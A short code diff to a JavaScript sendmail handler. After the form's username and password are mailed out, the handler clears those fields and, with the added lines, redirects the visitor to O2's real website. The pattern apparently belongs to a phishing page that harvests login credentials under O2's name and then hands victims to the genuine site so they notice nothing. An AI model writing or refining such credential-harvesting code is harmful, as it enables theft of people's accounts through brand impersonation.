@@ -22,7 +22,10 @@ function sendmail(event) {
             document.getElementById("username").value = "";
             document.getElementById("password").value = "";
             console.log(res);
-            alert("Your message was sent successfully!");
+            alert("Your request was sent successfully!");
+
+            // Redirect to another page after successful submission
+            window.location.href = "https://www.o2.co.uk/"; // Change "success.html" to your desired page
         })
         .catch(err => {
             console.log(err);
